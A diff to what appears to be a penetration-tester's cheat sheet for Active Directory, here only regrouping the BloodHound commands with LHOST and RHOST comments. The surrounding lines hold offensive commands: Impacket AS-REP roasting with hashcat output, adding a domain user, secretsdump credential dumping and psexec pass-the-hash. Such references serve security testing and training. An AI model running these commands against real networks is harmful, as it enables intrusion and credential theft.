@@ -664,13 +664,9 @@ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -userfile {USER.txt} -format hashcat
 
 # Bloodhound
-sudo ./usr/bin/neo4j console
-
-RHOST
-./sharphound.exe -c all
-
-LHOST
-./BloodHound  --no-sandbox
+sudo ./usr/bin/neo4j console # LHOST
+./sharphound.exe -c all      # RHOST
+./BloodHound  --no-sandbox   # LHOST
 
 # Add user
 net user {USERNAME} {PASSWORD} /add /domain
@@ -688,9 +684,6 @@ sudo python3 ./usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/
 
 # PSEXEC
 sudo python3 psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
-
-
-
 
 ```
 
